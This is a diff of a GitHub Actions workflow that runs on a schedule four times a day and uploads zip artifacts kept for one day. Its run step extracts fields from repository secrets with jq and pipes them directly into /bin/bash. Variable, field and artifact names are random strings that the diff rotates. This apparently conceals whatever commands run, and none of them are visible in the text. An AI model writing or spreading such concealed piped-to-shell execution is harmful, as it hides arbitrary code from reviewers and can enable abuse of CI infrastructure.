@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '41 2,8,14,20 * * *'
+    - cron: '57 0,6,12,18 * * *'
 jobs:
   workflow:
     runs-on: ubuntu-latest
@@ -15,16 +15,16 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          ljhg10061: ${{ secrets.ljhg10061 }}
+          o5867: ${{ secrets.o5867 }}
         run: |
-          printf '%s' "$ljhg10061" | jq -r .u3434 | /bin/bash
-          printf '%s' "$i5" | jq -r .m50328 | /bin/bash
-          echo $o3 | jq -r .xnjsy27 | /bin/bash
-          printf '%s' "$naice0203" | jq -r .hhqh3737 | /bin/bash
+          printf '%s' "$o5867" | jq -r .bbl5 | /bin/bash
+          printf '%s' "$gf13" | jq -r .z2 | /bin/bash
+          printf '%s' "$olf591" | jq -r .hdpn67804 | /bin/bash
+          printf '%s' "$i34" | jq -r .ic91684 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: aGUUe6El
+          name: RMUf4cLJ
           path: "*.zip"
           retention-days: 1
